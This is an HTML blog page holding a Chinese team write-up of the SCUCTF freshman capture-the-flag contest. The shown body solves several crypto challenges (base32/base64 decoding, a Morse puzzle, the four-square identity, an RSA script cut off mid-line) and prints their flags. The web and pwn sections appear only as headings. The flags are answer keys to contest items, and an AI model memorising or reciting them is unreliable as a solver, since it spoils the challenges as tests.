@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"junyu33.me","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="这场新生赛题目质量不错，我们“幽篁终见天”战队的每位成员都发挥了自己的长处，在比赛中玩得很尽兴。以下是排行榜截图和战队wp：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="scuctf新生赛——幽篁终见天战队wp">
+<meta property="og:url" content="https://junyu33.me/2021/11/23/ctf04.html">
+<meta property="og:site_name" content="现充|junyu33">
+<meta property="og:description" content="这场新生赛题目质量不错，我们“幽篁终见天”战队的每位成员都发挥了自己的长处，在比赛中玩得很尽兴。以下是排行榜截图和战队wp：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/rank.jpg">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto3_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto3.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto5.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto7.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/crypto8.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/misc5_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/misc5.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/stego2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/java.jpg">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re5.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/happyre.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re4.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re9.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re9_2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re9_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/osint2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/osint2_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/osint2_2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re7.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re7_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_3.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_4.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_5.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/re8_6.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web2_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web5.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web5_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web7.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/web7_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/ssti.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/ssti_1.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/ssti_2.png">
+<meta property="og:image" content="https://junyu33.me/2021/11/23/ctf04/ssti_3.png">
+<meta property="article:published_time" content="2021-11-23T15:50:00.000Z">
+<meta property="article:modified_time" content="2021-11-23T23:46:32.862Z">
+<meta property="article:author" content="丨junyu33丨">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="reverse">
+<meta property="article:tag" content="crypto">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="c">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://junyu33.me/2021/11/23/ctf04/rank.jpg">
+
+
+<link rel="canonical" href="https://junyu33.me/2021/11/23/ctf04.html">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>scuctf新生赛——幽篁终见天战队wp | 现充|junyu33</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">现充|junyu33</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-bounce.css" rel="stylesheet">
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WriteUp-from-junyu33"><span class="nav-number">1.</span> <span class="nav-text">WriteUp from junyu33</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-1-singin-Classic"><span class="nav-number">1.1.</span> <span class="nav-text">Crypto-1:singin_Classic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-2-ez-classic"><span class="nav-number">1.2.</span> <span class="nav-text">Crypto-2:ez_classic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-3-number-theory"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto-3:number_theory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-4-ez-RSA"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto-4:ez_RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-5-strange-RSA"><span class="nav-number">1.5.</span> <span class="nav-text">Crypto-5:strange_RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-7-Elliptic-Curve"><span class="nav-number">1.6.</span> <span class="nav-text">Crypto-7:Elliptic Curve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-8-Vigenere"><span class="nav-number">1.7.</span> <span class="nav-text">Crypto-8:Vigenere</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-1-test-your-nc"><span class="nav-number">1.8.</span> <span class="nav-text">Misc-1:test_your_nc~~~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-2-OldKinderhoek"><span class="nav-number">1.9.</span> <span class="nav-text">Misc-2:OldKinderhoek</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-3-test-your-nc"><span class="nav-number">1.10.</span> <span class="nav-text">Misc-3:test_your_nc~~~~~~~~~</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-4-Time-To-Leave"><span class="nav-number">1.11.</span> <span class="nav-text">Misc-4:Time To Leave</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-5-Fire-in-the-hole"><span class="nav-number">1.12.</span> <span class="nav-text">Misc-5:Fire in the hole</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-6-Puny%E5%85%88%E8%BE%88%E7%9A%84%E5%92%86%E5%93%AE"><span class="nav-number">1.13.</span> <span class="nav-text">Misc-6:Puny先辈的咆哮</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stego-1-EZ-Steg"><span class="nav-number">1.14.</span> <span class="nav-text">Stego-1:EZ_Steg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stego-2-Baby-Steg"><span class="nav-number">1.15.</span> <span class="nav-text">Stego-2:Baby_Steg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-vscodeServer"><span class="nav-number">1.16.</span> <span class="nav-text">Web:vscodeServer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-6-include"><span class="nav-number">1.17.</span> <span class="nav-text">Web-6:include</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.18.</span> <span class="nav-text">Java:命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint-3-%E5%AF%82%E5%AF%9E%E7%9A%84%E5%A4%9C"><span class="nav-number">1.19.</span> <span class="nav-text">Osint-3:寂寞的夜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-1-test-your-nc"><span class="nav-number">1.20.</span> <span class="nav-text">Pwn-1:test_your_nc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-2-quiz"><span class="nav-number">1.21.</span> <span class="nav-text">Pwn-2:quiz</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-3-stackoverflow"><span class="nav-number">1.22.</span> <span class="nav-text">Pwn-3:stackoverflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-4-ret2shellcode"><span class="nav-number">1.23.</span> <span class="nav-text">Pwn-4:ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re5-ezapk"><span class="nav-number">1.24.</span> <span class="nav-text">Re5:ezapk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HappyRe-ezJava"><span class="nav-number">1.25.</span> <span class="nav-text">HappyRe:ezJava</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re4-Upxed"><span class="nav-number">1.26.</span> <span class="nav-text">Re4:Upxed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re9-Plants-Vs-Zombies%EF%BC%88%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%89"><span class="nav-number">1.27.</span> <span class="nav-text">Re9:Plants_Vs_Zombies（非预期解）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WriteUp-from-xiran"><span class="nav-number">2.</span> <span class="nav-text">WriteUp from xiran</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint-1%EF%BC%9A%E8%AF%A5%E8%B5%B0%E5%93%AA%E6%9D%A1%E8%B7%AF"><span class="nav-number">2.1.</span> <span class="nav-text">Osint-1：该走哪条路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint-2%EF%BC%9A%E8%B5%B6%E7%81%AB%E8%BD%A6"><span class="nav-number">2.2.</span> <span class="nav-text">Osint-2：赶火车</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint-4%EF%BC%9A%E8%93%9D%E8%89%B2%E6%98%9F%E7%90%83"><span class="nav-number">2.3.</span> <span class="nav-text">Osint-4：蓝色星球</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Osint-5%EF%BC%9A%E6%97%85%E8%A1%8C%E6%97%A5%E8%AE%B0"><span class="nav-number">2.4.</span> <span class="nav-text">Osint-5：旅行日记</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE1-Welcome"><span class="nav-number">2.5.</span> <span class="nav-text">RE1:Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE2-Xor"><span class="nav-number">2.6.</span> <span class="nav-text">RE2:Xor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE3-DebugMe"><span class="nav-number">2.7.</span> <span class="nav-text">RE3:DebugMe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE6-EzLinearEquation"><span class="nav-number">2.8.</span> <span class="nav-text">RE6:EzLinearEquation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE7-VirtualMachine"><span class="nav-number">2.9.</span> <span class="nav-text">RE7:VirtualMachine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HardRe-Fxxk"><span class="nav-number">2.10.</span> <span class="nav-text">HardRe:Fxxk</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WriteUp-from-Cyan"><span class="nav-number">3.</span> <span class="nav-text">WriteUp from Cyan</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web1-Get-amp-Post"><span class="nav-number">3.1.</span> <span class="nav-text">[Web1] Get&amp;Post</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web2-Hardphp"><span class="nav-number">3.2.</span> <span class="nav-text">[Web2] Hardphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web5-%E6%8A%BD%E8%B1%A1%E7%9A%84%E4%BB%A3%E7%A0%81%E8%89%BA%E6%9C%AF"><span class="nav-number">3.3.</span> <span class="nav-text">[Web5]抽象的代码艺术</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web7-curl-curl-curl"><span class="nav-number">3.4.</span> <span class="nav-text">[Web7] curl_curl_curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-ezSSTI"><span class="nav-number">3.5.</span> <span class="nav-text">[Web]ezSSTI</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="丨junyu33丨"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">丨junyu33丨</p>
+  <div class="site-description" itemprop="description">flag{CU73_D3V1L}</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/junyu33" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;junyu33" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2021141530091@stu.scu.edu.cn" title="E-Mail → mailto:2021141530091@stu.scu.edu.cn" rel="noopener" target="_blank"><i class="fab fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="tencent://message/?uin=2658799217&Site=&menu=yes" title="QQ → tencent:&#x2F;&#x2F;message&#x2F;?uin&#x3D;2658799217&amp;Site&#x3D;&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://denerate.ink/" title="https:&#x2F;&#x2F;denerate.ink&#x2F;" rel="noopener" target="_blank">DeNeRATe</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://land.master-hash.workers.dev/" title="https:&#x2F;&#x2F;land.master-hash.workers.dev&#x2F;" rel="noopener" target="_blank">hash</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mivik.gitee.io/" title="https:&#x2F;&#x2F;mivik.gitee.io&#x2F;" rel="noopener" target="_blank">Mivik</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sjfhsjfh.gitee.io/" title="https:&#x2F;&#x2F;sjfhsjfh.gitee.io&#x2F;" rel="noopener" target="_blank">sjfhsjfh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.xecades.xyz/" title="https:&#x2F;&#x2F;blog.xecades.xyz&#x2F;" rel="noopener" target="_blank">Xecades</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.bluesadi.cn/" title="http:&#x2F;&#x2F;blog.bluesadi.cn&#x2F;" rel="noopener" target="_blank">34r7hm4n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://acheing.com/" title="https:&#x2F;&#x2F;acheing.com&#x2F;" rel="noopener" target="_blank">acheing</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://sh1k4ku.github.io/" title="https:&#x2F;&#x2F;sh1k4ku.github.io&#x2F;" rel="noopener" target="_blank">sh1kaku</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://herbidog.cc/" title="https:&#x2F;&#x2F;herbidog.cc&#x2F;" rel="noopener" target="_blank">Xfish</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wuuuudle.com/" title="https:&#x2F;&#x2F;wuuuudle.com&#x2F;" rel="noopener" target="_blank">wudi</a>
+        </li>
+    </ul>
+  </div>
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2021/11/23/ctf04.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="丨junyu33丨">
+      <meta itemprop="description" content="flag{CU73_D3V1L}">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="现充|junyu33">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          scuctf新生赛——幽篁终见天战队wp
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-23 23:50:00" itemprop="dateCreated datePublished" datetime="2021-11-23T23:50:00+08:00">2021-11-23</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-24 07:46:32" itemprop="dateModified" datetime="2021-11-24T07:46:32+08:00">2021-11-24</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2021/11/23/ctf04.html" class="post-meta-item twikoo_visitors" data-flag-title="scuctf新生赛——幽篁终见天战队wp" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="twikoo_visitors"></span>
+    </span>
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>这场新生赛题目质量不错，我们“幽篁终见天”战队的每位成员都发挥了自己的长处，在比赛中玩得很尽兴。以下是排行榜截图和战队wp：</p>
+<p><img src="/2021/11/23/ctf04/rank.jpg" style="zoom:50%;"></p>
+<span id="more"></span>
+<h1 id="WriteUp-from-junyu33"><a href="#WriteUp-from-junyu33" class="headerlink" title="WriteUp from junyu33"></a>WriteUp from junyu33</h1><h2 id="Crypto-1-singin-Classic"><a href="#Crypto-1-singin-Classic" class="headerlink" title="Crypto-1:singin_Classic"></a>Crypto-1:singin_Classic</h2><p>HAZTMNZYGU3DOOBUG4YDCMRTHA3DKMBYGYYTCNJYHE2TANJXGEYTMOJQHA3DKNZUHA4TQNBZGU3TQNBYGE2DSOBWGY4DQNRWHE4DSMJQGQYTENI=</p>
+<p>(base32)</p>
+<p>836785678470123865086115895057116908657489849578481498668866989104125</p>
+<p>(ascii)</p>
+<p>83 67 85 67 84 70 123 86 50 86 115 89 50 57 116 90 86 57 48 98 49 57 84 81 49 86 68 86 69 89 104 125</p>
+<p>SCUCTF{V2VsY29tZV90b19TQ1VDVEYh}</p>
+<p>(base64)</p>
+<p>SCUCTF{Welcome_to_SCUCTF!}</p>
+<h2 id="Crypto-2-ez-classic"><a href="#Crypto-2-ez-classic" class="headerlink" title="Crypto-2:ez_classic"></a>Crypto-2:ez_classic</h2><p>打开文件是一串01编码，根据提示可知密文的读法是两行交错来读（我开始以为W型指栅栏密码），可以使用脚本先读奇数位，再读偶数位。</p>
+<p>之后的01串转成ascii，每八个分成一组，再打印十进制数值，得到了210与226两个数，猜想又是一种01串，长度为72。</p>
+<p>如果把72再转成ascii，长度就只有9了，显然不可能。考虑morse，我们把210看成0，226看成1，试一下前几位，并没有看到有意义的文字。然而把210看成1，226看成0，就得到了以下图片：</p>
+<p><img src="/2021/11/23/ctf04/crypto2.png"></p>
+<p>但是最难的地方是：<strong>morse不是非前缀编码，这就意味着不能在线性的时间内解密出原文，而且一个密文可以对应多个原文！</strong></p>
+<p>（你看，flag中就没有tql的字段，但是我就推出来了）</p>
+<p>经过与出题人的亲切交流，他告诉了我中间大部分的原文，然后剩下的只能靠暴搜解决了。</p>
+<p>题目出得不是特别好。</p>
+<p>SCUCTF{B1N?F3NCE!}</p>
+<h2 id="Crypto-3-number-theory"><a href="#Crypto-3-number-theory" class="headerlink" title="Crypto-3:number_theory"></a>Crypto-3:number_theory</h2><p>真·数学题</p>
+<p>题目的意思是，找p,q,r,s，使等式</p>
+<script type="math/tex; mode=display">(a^2+b^2+c^2+d^2)(x^2+y^2+z^2+w^2)=p^2+q^2+r^2+s^2</script><p>恒成立。</p>
+<p>我的第一直觉是去问一个数学好的人，于是我求教了今年丘成桐女子中学生数学竞赛金奖的得主。</p>
+<p><img src="/2021/11/23/ctf04/crypto3_1.png"></p>
+<p>（真正学数学的怎么会搞这种无聊的东西qwq）</p>
+<p>于是我在Wikipedia上找到了答案，欧拉太强了！！！</p>
+<p><img src="/2021/11/23/ctf04/crypto3.png"></p>
+<h2 id="Crypto-4-ez-RSA"><a href="#Crypto-4-ez-RSA" class="headerlink" title="Crypto-4:ez_RSA"></a>Crypto-4:ez_RSA</h2><p>Rsa模板题。了解rsa原理的，并且经历了python装插件这个难关的，都能做出来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">213043791008118001973620295219389127641</span></span><br><span class="line">q = <span class="number">288394236514907373490429135931237985191</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">2064504307456306488731553002068102151545513181275073778820466336566521706326</span> </span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span> (<span 